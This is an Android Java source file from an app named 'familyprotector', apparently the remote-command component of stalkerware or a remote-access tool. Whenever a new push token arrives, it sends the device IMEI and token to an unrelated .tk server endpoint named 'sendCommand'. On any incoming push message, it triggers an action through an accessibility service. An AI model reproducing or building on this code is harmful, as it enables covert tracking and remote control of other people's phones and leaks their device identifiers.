package com.family.familyprotector;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.family.accessibility.MyAccessibilityService;
import com.family.internet.ServerHelper;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    @Override
    public void onNewToken(String token) {
        Log.d("FIFI", "Refreshed token: " + token);

        //send server
        postJSON(token);
    }
    public void postJSON(String token) {
        JSONObject postData = new JSONObject();
        Log.d("posted", "posJson from Firebase");
        String ts = Context.TELEPHONY_SERVICE;
        String imei = new Device().getImei(this);
        try {
            postData.put("t", token);
            postData.put("i", imei);
            new ServerHelper(this).execute("http://tmhgame.tk/sendCommand", postData.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void onMessageReceived(RemoteMessage message) {
        Log.d("FIFI", message.getFrom() + "ALDIM");
        Log.d("FIFI", message.getData().toString());
        MyAccessibilityService.instance.sondur();
    }
}
